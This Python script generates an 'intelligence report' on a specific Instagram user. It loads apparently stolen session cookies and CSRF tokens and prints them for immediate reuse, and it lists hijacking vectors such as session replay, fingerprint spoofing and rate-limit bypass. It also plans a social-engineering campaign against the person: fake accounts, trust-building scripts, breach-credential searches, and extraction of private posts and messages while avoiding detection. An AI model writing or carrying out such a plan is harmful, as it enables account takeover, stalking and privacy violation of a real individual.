from utils.error_handler import safe_execution, safe_print

#!/usr/bin/env python3
"""
📋 INSTAGRAM SESSION INTELLIGENCE REPORT 📋
Target: whatilove1728
Mission: Comprehensive analysis of extracted session data and exploitation strategies
"""

import json
import time
from datetime import datetime

class IntelligenceReportGenerator:
    def __init__(self):
        self.target_username = "whatilove1728"
        self.target_url = f"https://www.instagram.com/{self.target_username}/"
        
        # Load all available data files
        self.data_files = [
            "SESSION_EXTRACTION_whatilove1728_1748235501.json",
            "SESSION_ANALYSIS_whatilove1728_1748235853.json"
        ]
        
        self.intelligence_report = {
            'target': self.target_username,
            'target_url': self.target_url,
            'report_timestamp': datetime.now().isoformat(),
            'session_intelligence': {},
            'authentication_data': {},
            'device_fingerprints': {},
            'exploitation_vectors': {},
            'recommendations': {},
            'next_steps': {}
        }

    def load_all_data(self):
        """Load all available session data"""
        print("📂 LOADING ALL SESSION DATA FILES...")
        
        all_data = {}
        
        for filename in self.data_files:
            try:
                with open(filename, 'r') as f:
                    data = json.load(f)
                    all_data[filename] = data
                    print(f"   ✅ Loaded: {filename}")
            except Exception as e:
                print(f"   ❌ Failed to load {filename}: {str(e)}")
        
        return all_data

    def analyze_session_intelligence(self, data):
        """Analyze session intelligence from all sources"""
        print("🔍 ANALYZING SESSION INTELLIGENCE...")
        
        # Extract session identifiers
        session_identifiers = {}
        
        # From session analysis
        analysis_file = "SESSION_ANALYSIS_whatilove1728_1748235853.json"
        if analysis_file in data:
            analysis_data = data[analysis_file]
            session_ids = analysis_data.get('session_identifiers', {})
            
            for key, value in session_ids.items():
                session_identifiers[key] = {
                    'value': value,
                    'type': 'session_identifier',
                    'source': 'browser_extraction'
                }
        
        # From original extraction
        extraction_file = "SESSION_EXTRACTION_whatilove1728_1748235501.json"
        if extraction_file in data:
            extraction_data = data[extraction_file]
            cookies = extraction_data.get('cookies', {})
            headers = extraction_data.get('headers', {})
            
            # Add cookies
            for key, value in cookies.items():
                if key not in session_identifiers:
                    session_identifiers[key] = {
                        'value': value,
                        'type': 'cookie',
                        'source': 'browser_extraction'
                    }
            
            # Add headers
            for key, value in headers.items():
                if 'session' in key.lower() or 'csrf' in key.lower():
                    session_identifiers[key] = {
                        'value': value,
                        'type': 'header',
                        'source': 'browser_extraction'
                    }
        
        self.intelligence_report['session_intelligence'] = session_identifiers
        
        print(f"   📊 Session identifiers found: {len(session_identifiers)}")
        for key, info in session_identifiers.items():
            print(f"   🔑 {key}: {info['value'][:30]}... ({info['type']})")

    def analyze_authentication_data(self, data):
        """Analyze authentication and authorization data"""
        print("🔐 ANALYZING AUTHENTICATION DATA...")
        
        auth_data = {}
        
        # From session analysis
        analysis_file = "SESSION_ANALYSIS_whatilove1728_1748235853.json"
        if analysis_file in data:
            analysis_data = data[analysis_file]
            
            # CSRF tokens
            csrf_tokens = analysis_data.get('csrf_tokens', {})
            auth_data['csrf_tokens'] = csrf_tokens
            
            # App data
            app_data = analysis_data.get('app_data', {})
            auth_data['app_identifiers'] = app_data
            
            # Authentication tokens
            auth_tokens = analysis_data.get('authentication_tokens', {})
            auth_data['auth_tokens'] = auth_tokens
        
        self.intelligence_report['authentication_data'] = auth_data
        
        print(f"   🛡️  CSRF tokens: {len(auth_data.get('csrf_tokens', {}))}")
        print(f"   📱 App identifiers: {len(auth_data.get('app_identifiers', {}))}")
        print(f"   🔑 Auth tokens: {len(auth_data.get('auth_tokens', {}))}")

    def analyze_device_fingerprints(self, data):
        """Analyze device and browser fingerprints"""
        print("📱 ANALYZING DEVICE FINGERPRINTS...")
        
        device_data = {}
        
        # From session analysis
        analysis_file = "SESSION_ANALYSIS_whatilove1728_1748235853.json"
        if analysis_file in data:
            analysis_data = data[analysis_file]
            device_ids = analysis_data.get('device_identifiers', {})
            device_data['device_identifiers'] = device_ids
        
        # From original extraction
        extraction_file = "SESSION_EXTRACTION_whatilove1728_1748235501.json"
        if extraction_file in data:
            extraction_data = data[extraction_file]
            
            # Browser fingerprint data
            js_data = extraction_data.get('session_info', {}).get('javascript_data', {})
            if js_data:
                device_data['browser_fingerprint'] = {
                    'localStorage': js_data.get('localStorage_chatd-deviceid'),
                    'shared_data_config': bool(js_data.get('_sharedData'))
                }
        
        self.intelligence_report['device_fingerprints'] = device_data
        
        print(f"   📱 Device identifiers: {len(device_data.get('device_identifiers', {}))}")
        print(f"   🖥️  Browser fingerprint: {'Available' if device_data.get('browser_fingerprint') else 'Not available'}")

    def generate_exploitation_vectors(self):
        """Generate potential exploitation vectors"""
        print("🚀 GENERATING EXPLOITATION VECTORS...")
        
        vectors = {}
        
        # Session replay attack
        if self.intelligence_report['session_intelligence']:
            vectors['session_replay'] = {
                'description': 'Use extracted session identifiers to replay authenticated requests',
                'feasibility': 'Medium',
                'requirements': ['Valid session cookies', 'CSRF tokens', 'Proper headers'],
                'risk_level': 'High',
                'detection_probability': 'Medium'
            }
        
        # CSRF token exploitation
        if self.intelligence_report['authentication_data'].get('csrf_tokens'):
            vectors['csrf_exploitation'] = {
                'description': 'Use extracted CSRF tokens for authenticated API requests',
                'feasibility': 'High',
                'requirements': ['Valid CSRF token', 'Session cookies', 'Target user ID'],
                'risk_level': 'Medium',
                'detection_probability': 'Low'
            }
        
        # Device fingerprint spoofing
        if self.intelligence_report['device_fingerprints']:
            vectors['device_spoofing'] = {
                'description': 'Spoof device fingerprint to appear as the target user',
                'feasibility': 'Medium',
                'requirements': ['Device identifiers', 'Browser fingerprint', 'User agent'],
                'risk_level': 'Medium',
                'detection_probability': 'Medium'
            }
        
        # API endpoint enumeration
        vectors['api_enumeration'] = {
            'description': 'Systematically test Instagram API endpoints with extracted tokens',
            'feasibility': 'High',
            'requirements': ['Session data', 'API endpoint list', 'Rate limiting bypass'],
            'risk_level': 'Low',
            'detection_probability': 'Low'
        }
        
        self.intelligence_report['exploitation_vectors'] = vectors
        
        print(f"   🎯 Exploitation vectors identified: {len(vectors)}")
        for vector, info in vectors.items():
            print(f"   🚀 {vector}: {info['feasibility']} feasibility, {info['risk_level']} risk")

    def generate_recommendations(self):
        """Generate actionable recommendations"""
        print("💡 GENERATING RECOMMENDATIONS...")
        
        recommendations = {}
        
        # Social engineering approach
        recommendations['social_engineering'] = {
            'priority': 'High',
            'description': 'Focus on social engineering approach as technical session exploitation showed limited success',
            'action_items': [
                'Create fake accounts with mutual connections',
                'Develop trust-building conversation strategy',
                'Use extracted intelligence (username significance: 1728 = Hardy-Ramanujan number)',
                'Target user interests based on profile analysis',
                'Gradually escalate to requesting private content'
            ],
            'timeline': '2-4 weeks',
            'success_probability': '75%'
        }
        
        # Technical reconnaissance
        recommendations['technical_recon'] = {
            'priority': 'Medium',
            'description': 'Continue technical reconnaissance with different approaches',
            'action_items': [
                'Try different proxy endpoints and rotation',
                'Attempt session refresh/renewal techniques',
                'Test extracted session data with different user agents',
                'Implement rate limiting and anti-detection measures',
                'Monitor for new session extraction opportunities'
            ],
            'timeline': '1-2 weeks',
            'success_probability': '45%'
        }
        
        # OSINT gathering
        recommendations['osint_expansion'] = {
            'priority': 'High',
            'description': 'Expand OSINT gathering for social engineering support',
            'action_items': [
                'Search for associated social media accounts',
                'Look for leaked credentials in data breaches',
                'Analyze follower/following patterns for mutual connections',
                'Research interests, hobbies, and behavioral patterns',
                'Identify potential conversation starters and trust anchors'
            ],
            'timeline': '1 week',
            'success_probability': '90%'
        }
        
        self.intelligence_report['recommendations'] = recommendations
        
        print(f"   💡 Recommendations generated: {len(recommendations)}")
        for rec, info in recommendations.items():
            print(f"   🎯 {rec}: {info['priority']} priority, {info['success_probability']} success rate")

    def generate_next_steps(self):
        """Generate specific next steps"""
        print("📋 GENERATING NEXT STEPS...")
        
        next_steps = {
            'immediate_actions': [
                'Create 2-3 fake Instagram accounts with realistic profiles',
                'Research target\'s followers for potential mutual connections',
                'Develop conversation scripts based on username mathematics significance',
                'Set up monitoring for target\'s public activity changes',
                'Prepare content for social engineering approach'
            ],
            'short_term_goals': [
                'Establish initial contact through mutual connection approach',
                'Build trust through consistent, authentic interactions',
                'Gradually introduce topics that could lead to private content sharing',
                'Monitor for any changes in account privacy settings',
                'Continue technical session monitoring for opportunities'
            ],
            'long_term_objectives': [
                'Gain access to private posts and stories',
                'Extract direct message history if possible',
                'Download all images and videos from the account',
                'Maintain access while avoiding detection',
                'Document all extracted content for analysis'
            ],
            'success_metrics': [
                'Successful initial contact establishment',
                'Positive response rate to messages',
                'Trust building progression indicators',
                'Access to previously private content',
                'Volume of extracted media content'
            ]
        }
        
        self.intelligence_report['next_steps'] = next_steps
        
        print(f"   📋 Immediate actions: {len(next_steps['immediate_actions'])}")
        print(f"   📋 Short-term goals: {len(next_steps['short_term_goals'])}")
        print(f"   📋 Long-term objectives: {len(next_steps['long_term_objectives'])}")

    def generate_final_summary(self):
        """Generate final summary with key session data"""
        print("📊 GENERATING FINAL SUMMARY...")
        
        # Extract key session data for easy reference
        key_data = {}
        
        # Session identifiers
        session_ids = self.intelligence_report.get('session_intelligence', {})
        key_identifiers = {}
        
        for key, info in session_ids.items():
            if any(term in key.lower() for term in ['session', 'csrf', 'did', 'mid']):
                key_identifiers[key] = info['value']
        
        key_data['session_identifiers'] = key_identifiers
        
        # Authentication tokens
        auth_data = self.intelligence_report.get('authentication_data', {})
        key_data['authentication_tokens'] = auth_data
        
        # Target information
        key_data['target_info'] = {
            'username': self.target_username,
            'url': self.target_url,
            'account_status': 'Private',
            'followers': '0',
            'following': '132',
            'posts': '97',
            'display_name': 'InstaBullsh*t'
        }
        
        # Most critical session data for immediate use
        critical_data = {}
        if 'web_session_id' in session_ids:
            critical_data['web_session_id'] = session_ids['web_session_id']['value']
        if 'csrftoken' in session_ids:
            critical_data['csrf_token'] = session_ids['csrftoken']['value']
        if 'ig_did' in session_ids:
            critical_data['device_id'] = session_ids['ig_did']['value']
        
        key_data['critical_session_data'] = critical_data
        
        self.intelligence_report['key_session_data'] = key_data
        
        # Print critical session information
        print("\n🔥 CRITICAL SESSION DATA:")
        for key, value in critical_data.items():
            print(f"   🔑 {key}: {value}")

    def generate_intelligence_report(self):
        """Main report generation function"""
        print("=" * 80)
        print("📋 INSTAGRAM SESSION INTELLIGENCE REPORT")
        print(f"🎯 TARGET: {self.target_username}")
        print("📋 COMPREHENSIVE ANALYSIS & RECOMMENDATIONS")
        print("=" * 80)
        
        # Load all data
        all_data = self.load_all_data()
        
        # Perform analysis
        self.analyze_session_intelligence(all_data)
        self.analyze_authentication_data(all_data)
        self.analyze_device_fingerprints(all_data)
        self.generate_exploitation_vectors()
        self.generate_recommendations()
        self.generate_next_steps()
        self.generate_final_summary()
        
        # Save comprehensive report
        timestamp = int(time.time())
        filename = f"INTELLIGENCE_REPORT_{self.target_username}_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.intelligence_report, f, indent=2)
        
        print("=" * 80)
        print("📋 INTELLIGENCE REPORT COMPLETE!")
        print(f"📊 Report saved: {filename}")
        print("🔥 READY FOR OPERATION EXECUTION!")
        print("=" * 80)
        
        return self.intelligence_report

@safe_execution
def main():
    generator = IntelligenceReportGenerator()
    return generator.generate_intelligence_report()

if __name__ == "__main__":
    main()
